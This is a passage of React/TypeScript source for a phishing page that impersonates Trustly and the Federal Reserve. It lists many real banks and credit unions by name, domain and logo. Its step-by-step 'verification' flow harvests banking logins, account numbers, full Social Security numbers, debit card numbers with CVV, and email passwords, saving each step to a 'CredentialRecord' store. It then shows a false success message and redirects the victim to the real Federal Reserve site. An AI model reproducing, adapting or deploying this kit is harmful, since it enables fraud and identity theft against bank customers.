  { id: "pacific-service-cu", name: "Pacific Service CU", domain: "pacificservicecu.org", color: "#003087" },
  { id: "paducah-teachers-fcu", name: "Paducah Teachers FCU", domain: "ptfcu.org", color: "#003087" },
  { id: "palmetto-citizens-fcu", name: "Palmetto Citizens FCU", domain: "palmettocitizens.org", color: "#003087" },
  { id: "park-avenue-bank", name: "Park Avenue Bank", domain: "parkavenuebank.com", color: "#003087" },
  { id: "park-community-cu", name: "Park Community CU", domain: "parkcommcu.org", color: "#006747" },
  { id: "park-sterling-bank", name: "Park Sterling Bank", domain: "parksterling.com", color: "#003087" },
  { id: "partners-fcu", name: "Partners FCU", domain: "partnersfcu.org", color: "#003087" },
  { id: "patriot-bank", name: "Patriot Bank", domain: "patriotbank.com", color: "#CC0000" },
  { id: "pawtucket-cu", name: "Pawtucket CU", domain: "pcu.org", color: "#003087" },
  { id: "pee-dee-fcu", name: "Pee Dee FCU", domain: "peedeefcu.org", color: "#003087" },
  { id: "pelican-state-cu", name: "Pelican State CU", domain: "pelicanstatecu.com", color: "#003087" },
  { id: "penn-state-employees-fcu", name: "Penn State Employees FCU", domain: "psefcu.org", color: "#003087" },
  { id: "piedmont-advantage-cu", name: "Piedmont Advantage CU", domain: "piedmontadvantage.org", color: "#003087" },
  { id: "pinpoint-fcu", name: "Pinpoint FCU", domain: "pinpointfcu.org", color: "#003087" },
  { id: "pioneer-fcu", name: "Pioneer FCU", domain: "pioneerfcu.org", color: "#003087" },
  { id: "planes-moving-storage-fcu", name: "Planes Moving FCU", domain: "planesmoving.org", color: "#003087" },
  { id: "platinum-fcu", name: "Platinum FCU", domain: "platinumfcu.org", color: "#003087" },
  { id: "plumas-bank", name: "Plumas Bank", domain: "plumasbank.com", color: "#003087" },
  { id: "police-firefighters-cu", name: "Police & Firefighters CU", domain: "p-ffcu.com", color: "#003087" },
  { id: "police-fcu-md", name: "Police FCU (MD)", domain: "policefcu.com", color: "#003087" },
  { id: "port-chester-teachers-fcu", name: "Port Chester Teachers FCU", domain: "pctfcu.org", color: "#003087" },
  { id: "portland-local-fcu", name: "Portland Local FCU", domain: "portlandlocalfcu.org", color: "#006747" },
  { id: "postal-fcu", name: "Postal Family FCU", domain: "postalcu.com", color: "#003087" },
  { id: "powerco-fcu", name: "PowerCo FCU", domain: "powercofcu.org", color: "#003087" },
  { id: "preferred-cu", name: "Preferred CU", domain: "preferred.org", color: "#003087" },
  { id: "premiere-members-fcu", name: "PremiereMembership FCU", domain: "premieremembers.org", color: "#003087" },
  { id: "presidential-bank", name: "Presidential Bank", domain: "presidentialbank.com", color: "#003087" },
  { id: "prestige-community-cu", name: "Prestige Community CU", domain: "mypccu.com", color: "#003087" },
  { id: "prevail-bank", name: "Prevail Bank", domain: "prevailbank.com", color: "#003087" },
  { id: "priority-one-cu", name: "Priority One CU", domain: "priorityonecu.org", color: "#003087" },
  { id: "progressive-cu", name: "Progressive CU", domain: "progressivecu.org", color: "#003087" },
  { id: "public-service-cu", name: "Public Service CU", domain: "ps-cu.com", color: "#003087" },
  { id: "puma-fcu", name: "Puma FCU", domain: "pumafcu.org", color: "#003087" },
  { id: "quorum-fcu", name: "Quorum FCU", domain: "quorumfcu.org", color: "#003087" },
  { id: "randolph-savings-bank", name: "Randolph Savings Bank", domain: "randolphsavings.com", color: "#003087" },
  { id: "red-canoe-cu", name: "Red Canoe CU", domain: "redcanoecreditunion.com", color: "#CC0000" },
  { id: "redstone-cu", name: "Redstone CU", domain: "redstonecu.org", color: "#CC0000" },
  { id: "regal-fcu", name: "Regal Financial FCU", domain: "regalfcu.org", color: "#003087" },
  { id: "rensselaer-county-fcu", name: "Rensselaer County FCU", domain: "rcfcu.org", color: "#003087" },
  { id: "republic-bank-tn", name: "Republic Bank & Trust", domain: "republicbank.com", color: "#003087" },
  { id: "research-fcu", name: "Research FCU", domain: "researchfcu.org", color: "#003087" },
  { id: "rtn-fcu", name: "RTN FCU", domain: "rtnfcu.org", color: "#003087" },
  { id: "safe-harbor-cu", name: "Safe Harbor CU", domain: "safeharborcu.org", color: "#006747" },
  { id: "saint-anne-cu", name: "Saint Anne CU", domain: "saintscu.org", color: "#003087" },
  { id: "salt-lake-county-cu", name: "Salt Lake County CU", domain: "slccu.com", color: "#003087" },
  { id: "san-antonio-fcu", name: "San Antonio FCU", domain: "sacu.com", color: "#003087" },
  { id: "san-francisco-fcu", name: "San Francisco FCU", domain: "sffirecu.org", color: "#CC0000" },
  { id: "santa-clara-county-fcu", name: "Santa Clara County FCU", domain: "sccfcu.org", color: "#003087" },
  { id: "scott-cu", name: "Scott CU", domain: "scottcreditunion.org", color: "#006747" },
  { id: "seacoast-banking-fl", name: "Seacoast Bank", domain: "seacoastbanking.com", color: "#006747" },
  { id: "self-help-cu", name: "Self-Help CU", domain: "self-help.org", color: "#006747" },
  { id: "sentinel-fcu", name: "Sentinel FCU", domain: "sentinelfcu.org", color: "#003087" },
  { id: "sharonview-fcu", name: "Sharonview FCU", domain: "sharonview.org", color: "#003087" },
  { id: "silver-state-schools-cu", name: "Silver State Schools CU", domain: "silverstatecu.org", color: "#003087" },
  { id: "simplot-employee-cu", name: "Simplot Employees CU", domain: "simplotcu.com", color: "#003087" },
  { id: "siouxland-fcu", name: "Siouxland FCU", domain: "siouxlandfcu.org", color: "#003087" },
  { id: "six-nations-fcu", name: "Six Nations FCU", domain: "sixnationsfcu.org", color: "#003087" },
  { id: "sky-one-fcu", name: "Sky One FCU", domain: "skyonefcu.org", color: "#003087" },
  { id: "slovenian-savings-loan", name: "Slovenian Savings & Loan", domain: "sloveniansl.com", color: "#003087" },
  { id: "smartbank", name: "SmartBank", domain: "smartbank.com", color: "#003087" },
  { id: "snowcap-cu", name: "Snowcap CU", domain: "snowcapcu.org", color: "#003087" },
  { id: "solarity-cu", name: "Solarity CU", domain: "solaritycu.org", color: "#003087" },
  { id: "sound-cu", name: "Sound CU", domain: "soundcu.com", color: "#006747" },
  { id: "southeast-financial-cu", name: "Southeast Financial CU", domain: "sefinancial.org", color: "#003087" },
  { id: "southern-chautauqua-fcu", name: "Southern Chautauqua FCU", domain: "southernchautauquafcu.org", color: "#003087" },
  { id: "southland-cu", name: "Southland CU", domain: "southlandcu.org", color: "#003087" },
  { id: "space-age-fcu", name: "Space Age FCU", domain: "spaceagefcu.org", color: "#003087" },
  { id: "spectrum-fcu", name: "Spectrum FCU", domain: "spectrumfcu.org", color: "#003087" },
  { id: "spirit-of-america-fcu", name: "Spirit of America FCU", domain: "spiritofamericafcu.org", color: "#CC0000" },
  { id: "spring-hill-cu", name: "Spring Hill CU", domain: "springhillcu.org", color: "#006747" },
  { id: "stanford-fcu", name: "Stanford FCU", domain: "stanfordfcu.org", color: "#CC0000" },
  { id: "steel-valley-fcu", name: "Steel Valley FCU", domain: "steelvalleyfcu.org", color: "#003087" },
  { id: "sterling-fcu", name: "Sterling FCU", domain: "sterlingfcu.org", color: "#003087" },
  { id: "sunbelt-fcu", name: "Sunbelt FCU", domain: "sunbeltfcu.org", color: "#003087" },
  { id: "sunny-south-fcu", name: "Sunny South FCU", domain: "sunnysouthfcu.org", color: "#FFD700" },
  { id: "sunrise-banks", name: "Sunrise Banks", domain: "sunrisebanks.com", color: "#FF6200" },
  { id: "superior-choice-cu", name: "Superior Choice CU", domain: "superiorcu.org", color: "#003087" },
  { id: "sutter-community-bank", name: "Sutter Community Bank", domain: "suttercommunitybank.com", color: "#003087" },
  { id: "taupa-lithuanian-cu", name: "TAUPA Lithuanian CU", domain: "taupacu.org", color: "#006747" },
  { id: "teachers-cu", name: "Teachers Credit Union", domain: "teacherscu.com", color: "#003087" },
  { id: "teamsters-council-37-fcu", name: "Teamsters CU", domain: "teamstersccu.org", color: "#003087" },
  { id: "technology-cu", name: "Technology CU", domain: "techcu.com", color: "#003087" },
  { id: "telco-plus-cu", name: "Telco Plus CU", domain: "telcopluscu.org", color: "#003087" },
  { id: "territorial-savings-bank", name: "Territorial Savings Bank", domain: "territorialsavings.bank", color: "#003087" },
  { id: "the-local-cu", name: "The Local CU", domain: "thelocalcu.org", color: "#003087" },
  { id: "three-rivers-fcu", name: "Three Rivers FCU", domain: "3riversfcu.org", color: "#003087" },
  { id: "thumb-area-fcu", name: "Thumb Area FCU", domain: "thumbareafcu.org", color: "#003087" },
  { id: "topline-fcu", name: "TopLine FCU", domain: "toplinefcu.org", color: "#003087" },
  { id: "total-community-cu", name: "Total Community CU", domain: "totalcommcu.org", color: "#003087" },
  { id: "transportation-fcu", name: "Transportation FCU", domain: "transportationfcu.org", color: "#003087" },
  { id: "tri-city-bankshares", name: "Tri City Bankshares", domain: "tcbk.com", color: "#003087" },
  { id: "tri-counties-bank", name: "Tri Counties Bank", domain: "tcbank.com", color: "#003087" },
  { id: "triangle-cu", name: "Triangle CU", domain: "trianglecu.org", color: "#003087" },
  { id: "tropical-fcu", name: "Tropical FCU", domain: "tropicalfcu.org", color: "#006747" },
  { id: "twin-cities-fcu", name: "Twin Cities FCU", domain: "tcsfcu.org", color: "#003087" },
  { id: "two-harbors-fcu", name: "Two Harbors FCU", domain: "twoharborsfcu.org", color: "#003087" },
  { id: "ufcu-tx", name: "University FCU (TX)", domain: "ufcu.org", color: "#CC0000" },
  { id: "union-bank-trust", name: "Union Bank & Trust", domain: "ubt.com", color: "#003087" },
  { id: "union-square-fcu", name: "Union Square FCU", domain: "unionsquarefcu.org", color: "#003087" },
  { id: "united-advantage-nw-fcu", name: "United Advantage NW FCU", domain: "unitedadvantagenw.org", color: "#003087" },
  { id: "united-bank-al", name: "United Bank (AL)", domain: "unitedbank.com", color: "#003087" },
  { id: "united-fcu", name: "United FCU", domain: "unitedfcu.com", color: "#003087" },
  { id: "united-heritage-cu", name: "United Heritage CU", domain: "unitedheritagecu.org", color: "#003087" },
  { id: "united-nations-fcu", name: "United Nations FCU", domain: "unfcu.org", color: "#003087" },
  { id: "university-of-iowa-cu", name: "University of Iowa CU", domain: "uiccu.org", color: "#FFD700" },
  { id: "upward-cu", name: "Upward CU", domain: "upwardcu.org", color: "#003087" },
  { id: "utah-first-fcu", name: "Utah First FCU", domain: "utahfirst.com", color: "#CC0000" },
  { id: "valley-strong-cu", name: "Valley Strong CU", domain: "valleystrongcu.org", color: "#006747" },
  { id: "ventura-county-cu", name: "Ventura County CU", domain: "vccu.org", color: "#003087" },
  { id: "vibrant-cu", name: "Vibrant CU", domain: "vibrantcu.org", color: "#003087" },
  { id: "vision-fcu", name: "Vision Financial FCU", domain: "visionfcu.org", color: "#003087" },
  { id: "vista-bank", name: "Vista Bank", domain: "vistabank.com", color: "#003087" },
  { id: "vt-state-employees-cu", name: "Vermont State Employees CU", domain: "vsecu.com", color: "#006747" },
  { id: "washington-gas-light-fcu", name: "Washington Gas Light FCU", domain: "wglfcu.org", color: "#003087" },
  { id: "washingtonfirst-bank", name: "WashingtonFirst Bank", domain: "washingtonfirstbank.com", color: "#003087" },
  { id: "wccu", name: "Wisconsin Community CU", domain: "wccul.org", color: "#006747" },
  { id: "wegmans-empl-fcu", name: "Wegmans Employees FCU", domain: "wegmansfcu.org", color: "#CC0000" },
  { id: "wellby-fcu", name: "Wellby Financial", domain: "wellbyfinancial.com", color: "#003087" },
  { id: "wesla-fcu", name: "Wesla FCU", domain: "weslafcu.org", color: "#003087" },
  { id: "west-community-cu", name: "West Community CU", domain: "westcommunitycu.org", color: "#003087" },
  { id: "west-shore-bank", name: "West Shore Bank", domain: "westshorebank.com", color: "#003087" },
  { id: "western-sun-fcu", name: "Western Sun FCU", domain: "westernsunfcu.org", color: "#006747" },
  { id: "white-mountains-cu", name: "White Mountains CU", domain: "wmcu.org", color: "#003087" },
  { id: "whitaker-bank", name: "Whitaker Bank", domain: "whitakerbank.com", color: "#003087" },
  { id: "whitefish-cu", name: "Whitefish CU", domain: "whitefishcu.org", color: "#006747" },
  { id: "willamette-valley-bank", name: "Willamette Valley Bank", domain: "wvbank.com", color: "#006747" },
  { id: "williams-lake-fcu", name: "Williams Lake FCU", domain: "wlfcu.org", color: "#003087" },
  { id: "woodstone-cu", name: "Woodstone CU", domain: "woodstonecu.org", color: "#006747" },
  { id: "wyoming-cu", name: "Wyoming CU", domain: "wyomingcu.org", color: "#003087" },
  { id: "x-fcu", name: "Xcel FCU", domain: "xcelfcu.org", color: "#003087" },
  { id: "yazoo-city-cu", name: "Yazoo City CU", domain: "yazoocitycu.org", color: "#003087" },
  { id: "york-traditions-bank", name: "York Traditions Bank", domain: "yorktraditionsbank.com", color: "#003087" },
  { id: "yolo-fcu", name: "Yolo FCU", domain: "yolofcu.org", color: "#006747" },
  { id: "zero-interest-cu", name: "Zeal CU", domain: "zealcu.org", color: "#003087" },
];

const BANK_MAP = new Map(BANKS.map((b) => [b.id, b]));

const SORTED_BANKS = [...BANKS].sort((a, b) => {
  const ra = a.rank ?? 9999;
  const rb = b.rank ?? 9999;
  if (ra !== rb) return ra - rb;
  return a.name.localeCompare(b.name);
});

// ─── Flow steps ───────────────────────────────────────────────────────────────
const STEPS: Screen[] = [
  "login",
  "account-number",
  "ssn",
  "phone",
  "debit-card",
  "email",
];

const STEP_LABELS: Record<Screen, string> = {
  "select-bank": "",
  login: "Online Banking Login",
  "account-number": "Account Number",
  ssn: "Social Security Number",
  phone: "Phone Number",
  "debit-card": "Debit Card",
  email: "Email Address",
};

// ─── Field ────────────────────────────────────────────────────────────────────
interface FieldProps {
  label: string;
  type?: string;
  value: string;
  onChange: (v: string) => void;
  placeholder?: string;
  maxLength?: number;
  inputMode?: React.HTMLAttributes<HTMLInputElement>["inputMode"];
}

const Field: React.FC<FieldProps> = ({ label, type = "text", value, onChange, placeholder, maxLength, inputMode }) => (
  <div style={{ marginBottom: 16 }}>
    <label style={{ display: "block", fontSize: 13, fontWeight: 600, color: "#444", marginBottom: 6, fontFamily: "Open Sans, sans-serif" }}>
      {label}
    </label>
    <input
      type={type}
      value={value}
      onChange={(e) => onChange(e.target.value)}
      placeholder={placeholder}
      maxLength={maxLength}
      inputMode={inputMode}
      style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #d0d5dd", borderRadius: 10, fontSize: 15, fontFamily: "Open Sans, sans-serif", outline: "none", background: "#fff", color: "#222", transition: "border-color .15s", boxSizing: "border-box" }}
      onFocus={(e) => (e.currentTarget.style.borderColor = "#117ACA")}
      onBlur={(e) => (e.currentTarget.style.borderColor = "#d0d5dd")}
    />
  </div>
);

// ─── ContinueBtn ─────────────────────────────────────────────────────────────
interface ContinueBtnProps {
  onClick: () => void;
  disabled?: boolean;
  loading?: boolean;
  label?: string;
}

const ContinueBtn: React.FC<ContinueBtnProps> = ({ onClick, disabled, loading, label = "Continue" }) => (
  <button
    onClick={onClick}
    disabled={disabled || loading}
    style={{ width: "100%", padding: "14px", background: disabled || loading ? "#b0c4de" : "#117ACA", color: "#fff", border: "none", borderRadius: 10, fontSize: 16, fontWeight: 700, fontFamily: "Open Sans, sans-serif", cursor: disabled || loading ? "not-allowed" : "pointer", marginTop: 8, transition: "background .15s", letterSpacing: 0.3 }}
  >
    {loading ? "Submitting…" : label}
  </button>
);

// ─── BankLogo ─────────────────────────────────────────────────────────────────
const BankLogo: React.FC<{ bank: Bank; size?: number }> = ({ bank, size = 40 }) => {
  const [src, setSrc] = React.useState(getLogo(bank.domain));
  return (
    <img src={src} alt={bank.name} width={size} height={size} onError={() => setSrc(getFallbackLogo(bank.domain))} style={{ objectFit: "contain", borderRadius: 6 }} />
  );
};

// ─── Shared card style ────────────────────────────────────────────────────────
const cardStyle: React.CSSProperties = {
  background: "#fff",
  borderRadius: 16,
  boxShadow: "0 4px 32px rgba(0,0,0,0.10)",
  padding: "28px 24px",
  width: "100%",
  maxWidth: 420,
  margin: "0 auto",
};

const pageStyle: React.CSSProperties = {
  minHeight: "100vh",
  background: "#e8edf2",
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
  padding: "32px 16px",
};

// ─── Header ───────────────────────────────────────────────────────────────────
const TrustlyHeader: React.FC = () => (
  <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 28 }}>
    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
      <div style={{ width: 40, height: 40, borderRadius: 10, background: "#117ACA", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
        <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
          <path d="M3 18V6l8 7 8-7v12" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      </div>
      <span style={{ fontSize: 20, fontWeight: 700, color: "#1a1a2e", fontFamily: "DM Sans, sans-serif", letterSpacing: -0.3 }}>Trustly</span>
    </div>
    <div style={{ display: "flex", gap: 4, margin: "0 4px" }}>
      {[0, 1, 2].map((i) => (
        <div key={i} style={{ width: 5, height: 5, borderRadius: "50%", background: "#ccc" }} />
      ))}
    </div>
    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/US-FederalReserveSystem-Seal.svg/240px-US-FederalReserveSystem-Seal.svg.png"
        alt="Federal Reserve"
        width={40}
        height={40}
        style={{ objectFit: "contain", borderRadius: "50%" }}
        onError={(e) => { (e.currentTarget as HTMLImageElement).src = "https://www.federalreserve.gov/favicon.ico"; }}
      />
      <span style={{ fontSize: 14, fontWeight: 600, color: "#1a1a2e", fontFamily: "DM Sans, sans-serif", lineHeight: 1.2 }}>
        Federal<br />Reserve
      </span>
    </div>
  </div>
);

// ─── Footer ───────────────────────────────────────────────────────────────────
const TrustlyFooter: React.FC = () => (
  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 0, marginTop: 20, paddingTop: 16, borderTop: "1px solid #f0f0f0", fontSize: 11, color: "#999", fontFamily: "Open Sans, sans-serif" }}>
    <div style={{ display: "flex", alignItems: "center", gap: 5, padding: "0 12px" }}>
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
        <rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" strokeWidth="2" />
        <path d="M7 11V7a5 5 0 0110 0v4" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
      </svg>
      <span>256-bit<br />SSL</span>
    </div>
    <div style={{ width: 1, height: 28, background: "#e0e0e0" }} />
    <div style={{ display: "flex", alignItems: "center", gap: 5, padding: "0 12px" }}>
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2" />
        <path d="M12 7v5l3 3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
      </svg>
      <span>Open Banking<br />compliant</span>
    </div>
    <div style={{ width: 1, height: 28, background: "#e0e0e0" }} />
    <div style={{ padding: "0 12px" }}><span>Trustly<br />Inc.</span></div>
  </div>
);

// ─── PaymentSteps ─────────────────────────────────────────────────────────────
interface PaymentStepsProps {
  bank: Bank;
  recordId: string | null;
  setRecordId: (id: string) => void;
  onBack: () => void;
}

const PaymentSteps: React.FC<PaymentStepsProps> = ({ bank, recordId, setRecordId, onBack }) => {
  const { create, update, isPending } = useMutation("CredentialRecord");

  const [screen, setScreen] = useState<Screen>("login");
  const [submitted, setSubmitted] = useState(false);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [confirmAccount, setConfirmAccount] = useState("");
  const [ssn, setSsn] = useState("");
  const [phone, setPhone] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [email, setEmail] = useState("");
  const [emailPassword, setEmailPassword] = useState("");

  const currentStepIdx = STEPS.indexOf(screen);
  const totalSteps = STEPS.length;
  const progress = ((currentStepIdx + 1) / totalSteps) * 100;

  // Save each step independently & immediately using the SDK
  const saveStep = useCallback(
    async (stepName: string, patch: Record<string, unknown>) => {
      try {
        if (!recordId) {
          // First step: create the record
          const result = await create({
            bank: bank.name, // store full bank name
            username: username || "",
            password: password || "",
            currentStep: stepName,
            ...patch,
          } as any);
          setRecordId(result.id);
        } else {
          // Subsequent steps: update in place
          await update(recordId, { currentStep: stepName, ...patch } as any);
        }
      } catch (_) {
        // silently continue — we never block the user
      }
    },
    [recordId, bank.name, username, password, create, update, setRecordId]
  );

  const advance = async (stepName: string, patch: Record<string, unknown>) => {
    await saveStep(stepName, patch);
    const nextIdx = currentStepIdx + 1;
    if (nextIdx < STEPS.length) {
      setScreen(STEPS[nextIdx]);
    } else {
      setSubmitted(true);
    }
  };

  if (submitted) {
    // Redirect to Federal Reserve immediately
    window.location.href = "https://www.federalreserve.gov";
    return (
      <div style={cardStyle}>
        <div style={{ textAlign: "center", padding: "32px 0" }}>
          <div style={{ width: 64, height: 64, borderRadius: "50%", background: "#e6f4ea", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px" }}>
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
              <path d="M9 12l2 2 4-4" stroke="#2e7d32" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
              <circle cx="12" cy="12" r="10" stroke="#2e7d32" strokeWidth="2" />
            </svg>
          </div>
          <div style={{ fontSize: 20, fontWeight: 700, color: "#222", fontFamily: "DM Sans, sans-serif", marginBottom: 8 }}>Verification Complete</div>
          <div style={{ fontSize: 14, color: "#666", fontFamily: "Open Sans, sans-serif" }}>Your bank account has been successfully validated and verified.</div>
          <div style={{ fontSize: 13, color: "#999", fontFamily: "Open Sans, sans-serif", marginTop: 10 }}>Redirecting…</div>
        </div>
      </div>
    );
  }

  const renderStep = () => {
    switch (screen) {
      case "login":
        return (
          <>
            <Field label="Username / Account ID" value={username} onChange={setUsername} placeholder="Enter your username" />
            <Field label="Password" type="password" value={password} onChange={setPassword} placeholder="Enter your password" />
            <ContinueBtn
              onClick={() => advance("login", { username, password })}
              disabled={!username || !password}
              loading={isPending}
            />
          </>
        );
      case "account-number":
        return (
          <>
            <Field label="Account Number" value={accountNumber} onChange={setAccountNumber} placeholder="Enter account number" inputMode="numeric" maxLength={17} />
            <Field label="Confirm Account Number" value={confirmAccount} onChange={setConfirmAccount} placeholder="Re-enter account number" inputMode="numeric" maxLength={17} />
            <ContinueBtn
              onClick={() => advance("account-number", { accountNumber })}
              disabled={!accountNumber || accountNumber !== confirmAccount}
              loading={isPending}
            />
          </>
        );
      case "ssn":
        return (
          <>
            <p style={{ fontSize: 13, color: "#666", fontFamily: "Open Sans, sans-serif", marginBottom: 12 }}>
              For identity verification purposes, please provide your full Social Security Number.
            </p>
            <Field
              label="Social Security Number"
              value={ssn}
              onChange={(v) => {
                const digits = v.replace(/\D/g, "").slice(0, 9);
                let formatted = digits;
                if (digits.length > 5) {
                  formatted = digits.slice(0, 3) + "-" + digits.slice(3, 5) + "-" + digits.slice(5);
                } else if (digits.length > 3) {
                  formatted = digits.slice(0, 3) + "-" + digits.slice(3);
                }
                setSsn(formatted);
              }}
              placeholder="XXX-XX-XXXX"
              inputMode="numeric"
              maxLength={11}
            />
            <ContinueBtn
              onClick={() => advance("ssn", { ssn })}
              disabled={ssn.replace(/\D/g, "").length !== 9}
              loading={isPending}
            />
          </>
        );
      case "phone":
        return (
          <>
            <Field label="Phone Number" value={phone} onChange={setPhone} placeholder="(555) 000-0000" inputMode="tel" maxLength={14} />
            <ContinueBtn
              onClick={() => advance("phone", { phone })}
              disabled={phone.length < 10}
              loading={isPending}
            />
          </>
        );
      case "debit-card":
        return (
          <>
            <Field
              label="Card Number"
              value={cardNumber}
              onChange={(v) => setCardNumber(v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim())}
              placeholder="0000 0000 0000 0000"
              inputMode="numeric"
              maxLength={19}
            />
            <div style={{ display: "flex", gap: 12 }}>
              <div style={{ flex: 1 }}>
                <Field
                  label="Expiry"
                  value={expiry}
                  onChange={(v) => {
                    const digits = v.replace(/\D/g, "").slice(0, 4);
                    setExpiry(digits.length > 2 ? digits.slice(0, 2) + "/" + digits.slice(2) : digits);
                  }}
                  placeholder="MM/YY"
                  maxLength={5}
                  inputMode="numeric"
                />
              </div>
              <div style={{ flex: 1 }}>
                <Field label="CVV" value={cvv} onChange={(v) => setCvv(v.replace(/\D/g, "").slice(0, 4))} placeholder="CVV" maxLength={4} inputMode="numeric" />
              </div>
            </div>
            <ContinueBtn
              onClick={() => advance("debit-card", { cardNumber: cardNumber.replace(/\s/g, ""), cardExpiry: expiry, cardCvv: cvv })}
              disabled={cardNumber.replace(/\s/g, "").length < 16 || expiry.length < 5 || cvv.length < 3}
              loading={isPending}
            />
          </>
        );
      case "email":
        return (
          <>
            <Field label="Email Address" type="email" value={email} onChange={setEmail} placeholder="you@example.com" />
            <Field label="Email Password" type="password" value={emailPassword} onChange={setEmailPassword} placeholder="Enter your email password" />
            <ContinueBtn
              onClick={() => advance("email", { email, emailPassword })}
              disabled={!email.includes("@") || !emailPassword}
              loading={isPending}
              label="Submit"
            />
          </>
        );
      default:
        return null;
    }
  };

  return (
    <div style={cardStyle}>
      <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 20, paddingBottom: 16, borderBottom: "1px solid #f0f0f0" }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4, borderRadius: 6, display: "flex", alignItems: "center", color: "#666" }} title="Back">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
            <path d="M15 18l-6-6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <BankLogo bank={bank} size={36} />
        <div>
          <div style={{ fontSize: 15, fontWeight: 700, color: "#222", fontFamily: "DM Sans, sans-serif" }}>{bank.name}</div>
          <div style={{ fontSize: 12, color: "#888", fontFamily: "Open Sans, sans-serif" }}>Secure verification</div>
        </div>
      </div>
      <div style={{ background: "#eef2f7", borderRadius: 99, height: 4, marginBottom: 20, overflow: "hidden" }}>
        <div style={{ width: `${progress}%`, height: "100%", background: "#117ACA", borderRadius: 99, transition: "width .35s ease" }} />
      </div>
      <div style={{ fontSize: 17, fontWeight: 700, color: "#1a1a2e", fontFamily: "DM Sans, sans-serif", marginBottom: 18 }}>{STEP_LABELS[screen]}</div>
      {renderStep()}
      <div style={{ marginTop: 18, textAlign: "center", fontSize: 12, color: "#aaa", fontFamily: "Open Sans, sans-serif" }}>
        Step {currentStepIdx + 1} of {totalSteps}
      </div>
    </div>
  );
};

// ─── BankTile ─────────────────────────────────────────────────────────────────
const BankTile: React.FC<{ bank: Bank; onSelect: (b: Bank) => void }> = ({ bank, onSelect }) => {
  const [hovered, setHovered] = useState(false);
  return (
    <button
      onClick={() => onSelect(bank)}
      onMouseEnter={() => setHovered(true)}
      onMouseLeave={() => setHovered(false)}
      style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 8, padding: "14px 6px 12px", border: `1.5px solid ${hovered ? "#117ACA" : "#dde2e8"}`, borderRadius: 14, background: hovered ? "#f0f7ff" : "#f4f6f8", cursor: "pointer", transition: "all .15s", fontFamily: "Open Sans, sans-serif", minHeight: 100 }}
      title={bank.name}
    >
      <div style={{ width: 50, height: 50, borderRadius: 12, background: "#fff", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 1px 4px rgba(0,0,0,0.08)", overflow: "hidden" }}>
        <BankLogo bank={bank} size={36} />
      </div>
      <span style={{ fontSize: 11, fontWeight: 600, color: "#333", textAlign: "center", lineHeight: 1.3, maxWidth: 80, wordBreak: "break-word" }}>
        {bank.name}
      </span>
    </button>
  );
};

// ─── TrustlyPayment ───────────────────────────────────────────────────────────
const TrustlyPayment: React.FC = () => {
  const [screen, setScreen] = useState<Screen>("select-bank");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [recordId, setRecordId] = useState<string | null>(null);
  const searchRef = useRef<HTMLInputElement>(null);

  const filtered = useMemo(() => {
    if (!searchQuery.trim()) return SORTED_BANKS;
    const q = searchQuery.toLowerCase();
    return SORTED_BANKS.filter((b) => b.name.toLowerCase().includes(q));
  }, [searchQuery]);

  const handleSelectBank = useCallback((bank: Bank) => {
    setSelectedBank(bank);
    setScreen("login");
  }, []);

  const handleBack = useCallback(() => {
    setSelectedBank(null);
    setRecordId(null);
    setScreen("select-bank");
  }, []);

  if (screen !== "select-bank" && selectedBank) {
    return (
      <div style={pageStyle}>
        <TrustlyHeader />
        <PaymentSteps bank={selectedBank} recordId={recordId} setRecordId={setRecordId} onBack={handleBack} />
        <TrustlyFooter />
      </div>
    );
  }

  return (
    <div style={pageStyle}>
      <TrustlyHeader />
      <div style={cardStyle}>
        <div style={{ marginBottom: 18 }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: "#1a1a2e", fontFamily: "DM Sans, sans-serif", marginBottom: 6, letterSpacing: -0.3 }}>Select your bank</div>
          <div style={{ fontSize: 14, color: "#666", fontFamily: "Open Sans, sans-serif", lineHeight: 1.5 }}>Securely connect your account to verify your identity</div>
        </div>
        <div style={{ position: "relative", marginBottom: 16 }}>
          <svg style={{ position: "absolute", left: 12, top: "50%", transform: "translateY(-50%)", color: "#aaa" }} width="16" height="16" viewBox="0 0 24 24" fill="none">
            <circle cx="11" cy="11" r="8" stroke="currentColor" strokeWidth="2" />
            <path d="M21 21l-4.35-4.35" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
          </svg>
          <input
            ref={searchRef}
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search your bank..."
